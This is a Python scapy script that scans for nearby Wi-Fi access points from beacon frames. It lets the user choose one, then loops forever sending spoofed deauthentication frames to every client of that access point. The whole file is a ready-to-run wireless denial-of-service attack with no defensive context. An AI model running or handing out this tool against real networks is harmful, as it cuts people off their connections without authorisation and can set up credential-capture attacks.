from scapy.all import *
from datetime import datetime
import sys
import time
import subprocess

# Client MAC Address
client = "FF:FF:FF:FF:FF:FF"# "90:21:81:3d:2f:d8" # Use This Option When You Don't Know Client Address
conf.iface = "en0"

# Sniffer Code:
found = {}

def sniffmgmt(p):
  stamgmtstypes = (0, 2, 4)
  if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
    ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
    probe = { "ssid": ssid, "cli": p.addr2 }
    key = "%s" % (p.addr2)
    found[key] = probe

sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=500)

probe_list = []
for key,probe in found.items():
  item = [key,probe]
  probe_list.append(item)

for i in range(len(probe_list)):
  item = probe_list[i]
  print(str(i) + " : " + str(item[1]["ssid"]))

ap = probe_list[int(input("index: "))][1]["cli"]

packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)

while True:
	sendp(packet, monitor=True)
